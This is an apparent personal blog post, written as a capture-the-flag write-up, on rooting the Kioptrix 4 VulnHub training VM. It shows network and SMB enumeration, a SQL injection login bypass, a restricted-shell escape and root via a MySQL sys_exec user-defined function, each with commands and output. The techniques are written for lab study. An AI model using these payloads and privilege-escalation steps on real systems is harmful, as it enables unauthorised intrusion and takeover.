@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en-us" data-theme="light"><head>
+    <title> Somesh Bhandarkar | Kioptrix 4 Vulnhub </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Graduate Candidate in Cybersecurity at the University of Maryland, College Park">
+    
+    <link rel="stylesheet" href="https://somesh-bhandarkar.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
+    
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://somesh-bhandarkar.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://somesh-bhandarkar.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://somesh-bhandarkar.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://somesh-bhandarkar.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://somesh-bhandarkar.github.io/post/kioptrix-4/">
+    
+    
+    <script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://somesh-bhandarkar.github.io/img/prof.jpeg" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m Somesh Bhandarkar</a></h3>
+        <div class="description">
+          <p>Graduate Candidate in Cybersecurity at the University of Maryland, College Park</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://linkedin.com/linkedin.com/in/somesh-bhandarkar" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/somesh-bhandarkar" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="bsomesh98@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Somesh Bhandarkar 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <ul class="nav">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+    </ul>
+    <div class="themeswitcher">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+    </div>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Kioptrix 4 Vulnhub
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Mon, Jun 1, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">6-minute read</span>
+        </div>
+        
+        </div>
+
+    <h1 id="kioptrix4">Kioptrix4</h1>
+<p>URL: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<h4 id="command-used">Command Used</h4>
+<blockquote>
+<p>nmap -sC -sV -O -A 192.168.48.139</p>
+</blockquote>
+<h4 id="result">Result</h4>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 12:00 EST
+Nmap scan report for 192.168.48.139
+Host is up (0.00098s latency).
+Not shown: 566 closed ports, 430 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:43:1D:50 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -2h29m58s, deviation: 3h32m08s, median: -4h59m59s
+|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2019-11-10T07:00:23-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.98 ms 192.168.48.139
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.39 seconds
+</code></pre><p>Here the ports of intrest are HTTP and SMB. So we further enumerate the samba ports.</p>
+<h3 id="enum4linux">Enum4linux</h3>
+<pre><code>enum4linux 192.168.48.139
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Nov 10 12:03:38 2019
+ ======================================== 
+|    OS information on 192.168.48.139    |
+ ======================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.48.139 from smbclient: 
+[+] Got OS info for 192.168.48.139 from srvinfo:
+	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	4.9
+	server type     :	0x809a03
+
+ =============================== 
+|    Users on 192.168.48.139    |
+ =============================== 
+index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
+index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
+index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
+index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
+index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)
+
+user:[nobody] rid:[0x1f5]
+user:[robert] rid:[0xbbc]
+user:[root] rid:[0x3e8]
+user:[john] rid:[0xbba]
+user:[loneferret] rid:[0xbb8]
+</code></pre><p>We know the version of samba is Samba(3.0.28a) from the Nmap scan. We also get a list of users nobody, robert, root, john and loneferret.
+Trying to bruteforce into SSH using the above users is of no avail</p>
+<p>So we check the port 80.
+<img src="/img/vulnhub/kioptrix-4/port80.png" alt="port80"></p>
+<p>Nikto does not give us any exploitable information.</p>
+<h3 id="gobuster">Gobuster</h3>
+<h4 id="command-used-1">Command Used</h4>
+<blockquote>
+<p>gobuster -u 192.168.48.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir</p>
+</blockquote>
+<pre><code>===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.48.139
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/11/10 12:28:58 Starting gobuster
+===============================================================
+/index (Status: 200)
+/images (Status: 301)
+/member (Status: 302)
+/logout (Status: 302)
+/john (Status: 301)
+/robert (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2019/11/10 12:29:48 Finished
+===============================================================
+</code></pre><p>We see that there is a hidden directory /john</p>
+<p><img src="/img/vulnhub/kioptrix-4/john-cont.png" alt="john-cont"></p>
+<p>On clicking the john.php we are redirected to a login page. Now to check whether it is vulnerable to SQL injection input username and password as &lsquo;.</p>
+<p><img src="/img/vulnhub/kioptrix-4/sqli-test.png" alt="sqli-test-ip"></p>
+<p><img src="/img/vulnhub/kioptrix-4/sqli-test-op.png" alt="sqli-test-op"></p>
+<p>We see an error message and that there is a file is <em>/var/www</em> called <em>checklogin.php</em> which probably checks the login credentials.</p>
+<p>Trying credentials <strong>Username:</strong> john <strong>passwd:</strong> clear&rsquo; or 1=1 #
+gives the credentials for john</p>
+<p><img src="/img/vulnhub/kioptrix-4/john-cred-ip.png" alt="john-cred-ip"></p>
+<p><img src="/img/vulnhub/kioptrix-4/john-cred-op.png" alt="john-cred-op"></p>
+<p>Trying credentials <strong>Username:</strong> robert <strong>passwd:</strong> clear&rsquo; or 1=1 #
+gives us credentials for robert</p>
+<p><img src="/img/vulnhub/kioptrix-4/robert-cred-op.png" alt="robert-cred-op"></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>SSH into user john using the enumerated credentials</p>
+<pre><code># ssh john@192.168.48.139
+john@192.168.48.139's password: 
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+john:~$ 
+john:~$ help
+cd  clear  echo  exit  help  ll  lpath  ls
+john:~$ echo &quot;$SHELL&quot;     
+*** forbidden path -&gt; &quot;/bin/kshell&quot;
+*** You have 0 warning(s) left, before getting kicked out.
+This incident has been reported.
+john:~$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+*** forbidden syntax -&gt; &quot;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'&quot;
+*** Kicked out
+Connection to 192.168.48.139 closed.
+</code></pre><p>It gives us a restricted shell, so to get out of it. Use command</p>
+<blockquote>
+<p>echo os.system(&quot;/bin/bash&rdquo;)</p>
+</blockquote>
+<pre><code>john:~$ echo os.system(&quot;/bin/bash&quot;)
+john@Kioptrix4:~$ whoami &amp;&amp; id
+john
+uid=1001(john) gid=1001(john) groups=1001(john)
+</code></pre><p>We check /var/www because during the SQL injection we can see that the config file exists here.</p>
+<pre><code>john@Kioptrix4:~$ pwd
+/home/john
+john@Kioptrix4:~$ cd /var/www
+john@Kioptrix4:/var/www$ ls
+checklogin.php  images     john               logout.php  robert
+database.sql    index.php  login_success.php  member.php
+john@Kioptrix4:/var/www$ cat checklogin.php 
+&lt;?php
+ob_start();
+$host=&quot;localhost&quot;; // Host name
+$username=&quot;root&quot;; // Mysql username
+$password=&quot;&quot;; // Mysql password
+$db_name=&quot;members&quot;; // Database name
+$tbl_name=&quot;members&quot;; // Table name
+
+
+john@Kioptrix4:/var/www$ ps -ef | grep mysql 
+root      4686     1  0 06:56 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+root      4728  4686  0 06:56 ?        00:00:01 /usr/sbin/mysqld --basedir=/usr
+root      4730  4686  0 06:56 ?        00:00:00 logger -p daemon.err -t mysqld_s
+john      5470  5385  0 08:46 pts/0    00:00:00 grep mysql
+
+john@Kioptrix4:/var/www$ locate udf
+/lib/modules/2.6.24-24-server/kernel/fs/udf
+/lib/modules/2.6.24-24-server/kernel/fs/udf/udf.ko
+/usr/lib/lib_mysqludf_sys.so
+/usr/share/mysql/mysql-test/include/have_udf.inc
+/usr/share/mysql/mysql-test/r/have_udf.require
+/usr/share/mysql/mysql-test/r/have_udf_example.require
+/usr/share/mysql/mysql-test/r/udf.result
+/usr/share/mysql/mysql-test/t/udf.test
+
+</code></pre><p>We see that MySQL login for root does not require a password.
+Also using command <em>ps -ef | grep mysql</em> we can see that root is running the mysql process.
+SQL has a module called User Defined Fucntion. To locate this module use “locate udf” and we find it on the system.</p>
+<p>Now log into mysql using <em>root</em> credentials</p>
+<pre><code>john@Kioptrix4:/var/www$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 29
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql&gt; 
+</code></pre><p>Now to check whether udf is available in mysql</p>
+<blockquote>
+<p>mysql&gt; SELECT * FROM mysql.func;</p>
+</blockquote>
+<p><img src="" alt=""></p>
+<p>It is available.
+Executed a system execution command to add user john to su</p>
+<blockquote>
+<p>mysql&gt; SELECT sys_exec(&lsquo;usermod -a -G admin john&rsquo;) ;</p>
+</blockquote>
+<p><img src="" alt=""></p>
+<pre><code>ohn@Kioptrix4:~$ sudo su
+[sudo] password for john: 
+root@Kioptrix4:/home/john# whoami
+root
+root@Kioptrix4:/home/john# 
+</code></pre><p>We get root. Now the flag.</p>
+<pre><code>root@Kioptrix4:/home/john# cat /root/congrats.txt
+Congratulations!
+You've got root.
+
+There is more then one way to get root on this system. Try and find them.
+I've only tested two (2) methods, but it doesn't mean there aren't more.
+As always there's an easy way, and a not so easy way to pop this box.
+Look for other methods to get root privileges other than running an exploit.
+
+It took a while to make this. For one it's not as easy as it may look, and
+also work and family life are my priorities. Hobbies are low on my list.
+Really hope you enjoyed this one.
+
+If you haven't already, check out the other VMs available on:
+www.kioptrix.com
+
+Thanks for playing,
+loneferret
+
+root@Kioptrix4:/home/john# 
+</code></pre>
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
